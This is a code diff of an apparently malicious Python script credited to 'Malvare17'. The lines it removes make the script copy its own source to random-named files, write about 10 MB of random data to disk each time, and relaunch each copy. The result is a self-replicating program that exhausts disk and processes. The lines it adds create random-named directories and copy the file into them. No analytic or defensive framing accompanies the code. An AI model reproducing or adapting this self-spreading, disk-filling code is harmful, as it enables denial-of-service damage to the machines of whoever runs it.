@@ -20,16 +20,14 @@ def WIN32_():
 	subprocess.Popen(["python", MyFile], shell = False)
 
 def LINUX_():
-	File_ = open(__file__).read()
-	ExampleName = RANDOM_(64)
+	DIR_NAME_1 = RANDOM_(32)
+	DIR_NAME_2 = RANDOM_(32)
+	DIR_NAME_3 = RANDOM_(32)
+	DIR_NAME_4 = RANDOM_(32)
 
-	with open(ExampleName + '.py','w') as f:
-		f.write(File_)
-	with open(ExampleName,'wb') as BigFile:
-		BigFile.write(os.urandom(10240000))
-
-	MyFile = '{}.py'.format(ExampleName)
-	subprocess.Popen(["python", MyFile], shell = False)
+	DirectoryName = DIR_NAME_1 + DIR_NAME_2 + DIR_NAME_3 + DIR_NAME_4
+	subprocess.call(['mkdir', DirectoryName])
+	subprocess.call(['cp', NAME, DirectoryName])
 
 class THREAD_(threading.Thread):
 	def __init__(self):
@@ -47,7 +45,6 @@ class THREAD_(threading.Thread):
 
 def AUTHOR_():
 	print("Author: Malvare17 | https://github.com/Malvare17")
-	START_()
 
 def START_():
 	Thread1 = THREAD_()
